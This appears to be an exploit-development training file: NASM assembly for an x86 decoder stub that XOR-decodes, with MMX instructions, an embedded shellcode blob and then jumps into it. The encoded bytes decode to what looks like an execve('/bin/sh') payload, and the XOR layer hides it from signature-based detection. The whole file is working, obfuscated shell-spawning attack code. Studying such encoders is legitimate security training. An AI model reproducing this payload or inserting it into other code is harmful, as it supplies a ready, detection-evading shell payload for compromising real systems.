; Filename: mmx-xor-decoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop edi
	lea esi, [edi +8]
	xor ecx, ecx
	mov cl, 4


decode:
	movq mm0, qword [edi]
	movq mm1, qword [esi]
	pxor mm0, mm1
	movq qword [esi], mm0
	add esi, 0x8
	loop decode

	jmp short EncodedShellcode	


call_decoder:

	call decoder
	decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
	EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
